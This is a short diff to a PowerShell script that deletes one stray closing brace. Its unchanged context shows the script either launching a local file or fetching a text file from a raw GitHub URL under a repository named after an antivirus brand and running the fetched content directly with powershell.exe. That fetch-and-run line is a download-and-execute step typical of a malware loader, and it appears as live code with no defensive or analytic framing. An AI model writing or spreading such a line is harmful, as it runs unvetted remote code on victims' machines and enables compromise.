@@ -62,7 +62,6 @@ if (Test-Path $outputFile) {
 }
 if (Test-Path $outputFile2) {
     Start-Process -FilePath $outputFile2
-    }
 } else {
     $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
 }
